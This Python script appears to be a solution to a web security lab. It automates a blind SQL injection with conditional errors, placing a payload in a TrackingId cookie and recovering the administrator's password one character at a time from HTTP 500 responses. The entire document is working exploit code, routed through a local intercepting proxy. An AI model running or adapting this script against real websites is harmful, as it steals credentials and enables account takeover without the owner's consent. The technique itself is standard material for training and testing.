import sys
import requests
import urllib3
from urllib.parse import quote
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies= {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
} 
headers={'User-Agent' : 'Mozilla/5.0'}

def sql(url):
    password_extracted = ""
    for i in range(1,21):
        for j in range(32,126):
            payload = f" '||(SELECT CASE WHEN ascii(SUBSTR(password,{i},1))={j} THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
            sql_payload = urllib.parse.quote(payload)
            cookies={'TrackingId': '9Jc0SmogWqbetkCb' + sql_payload,'session': 'kYxed5h9L3tuJa38riOESYBNAsmGIGJT'}
            r= requests.get(url,proxies=proxies,cookies=cookies,verify=False,headers=headers)
            if r.status_code == 500:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r'+password_extracted+chr(j))
                sys.stdout.flush()

if __name__== '__main__':
    try:
        base_url= sys.argv[1]
    except IndexError:
         print("format = script.py <URL path> <payload>")
         sys.exit(-1)
    sql(base_url)